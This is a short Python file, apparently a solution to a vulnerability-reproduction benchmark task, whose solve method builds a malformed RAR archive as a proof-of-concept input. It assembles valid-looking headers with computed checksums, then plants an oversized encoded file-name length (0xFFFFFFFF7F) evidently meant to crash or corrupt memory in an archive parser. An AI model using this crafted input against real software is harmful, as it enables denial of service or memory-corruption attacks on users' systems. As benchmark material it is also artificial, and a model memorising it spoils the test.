class Solution:
    def solve(self, src_path: str) -> bytes:
        def crc16(data: bytes) -> int:
            crc = 0
            for b in data:
                crc ^= b << 8
                for _ in range(8):
                    if crc & 0x8000:
                        crc = (crc << 1) ^ 0x1021
                    else:
                        crc = (crc << 1) & 0xFFFF
                    crc &= 0xFFFF
            return crc

        signature = b'Rar!\x1A\x07\x01'
        # Main header
        main_size = 8
        main_size_bytes = main_size.to_bytes(4, 'little')
        main_type = b'\x00'
        main_flags = b'\x00'
        main_data_for_crc = main_size_bytes + main_type + main_flags
        main_crc = crc16(main_data_for_crc)
        main_header = main_crc.to_bytes(2, 'little') + main_data_for_crc
        # File header
        file_flags = b'\x00\x00'
        file_mode = b'\x00\x00'
        host_os = b'\x00'
        file_crc = b'\x00\x00\x00\x00'
        unp_size = b'\x00\x00\x00\x00'
        pack_size = b'\x00\x00\x00\x00'
        timestamp = b'\x00\x00\x00\x00'
        method = b'\x30'
        unpack_ver = b'\x03'
        reserved = b'\x00\x00'
        fixed = file_flags + file_mode + host_os + file_crc + unp_size + pack_size + timestamp + method + unpack_ver + reserved
        name_len_enc = b'\xff\xff\xff\xff\x7f'
        body = fixed + name_len_enc
        file_size = 37
        file_size_bytes = file_size.to_bytes(4, 'little')
        file_type = b'\x01'
        file_data_for_crc = file_size_bytes + file_type + body
        file_crc_val = crc16(file_data_for_crc)
        file_header = file_crc_val.to_bytes(2, 'little') + file_data_for_crc
        poc = signature + main_header + file_header
        return poc